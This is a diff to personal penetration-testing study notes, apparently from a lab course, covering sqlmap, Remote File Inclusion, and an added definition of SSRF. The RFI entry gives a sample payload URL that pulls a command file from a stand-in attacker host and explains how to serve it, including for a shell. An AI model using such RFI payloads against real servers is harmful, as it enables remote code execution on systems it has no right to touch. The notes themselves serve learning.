@@ -59,3 +59,7 @@ sqlmap: tool used for sql injection
 - <span style="color:rgb(146, 208, 80)">RFI</span>: allows an attacker to inject an external URL into the include function, one requirement is that the `allow_url_fopen` option needs to be on
     `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
     we can do RFI by starting python3 -m http.server 9000 on a tab and input in the form `http:<ip>:port/file.txt` (works with shell too)
+
+
+<span style="color:rgb(255, 255, 0)">SSRF</span>:
+- (Server-side Request Forgery), cause the server-side application to make requests to a destination of the attacker's choosing
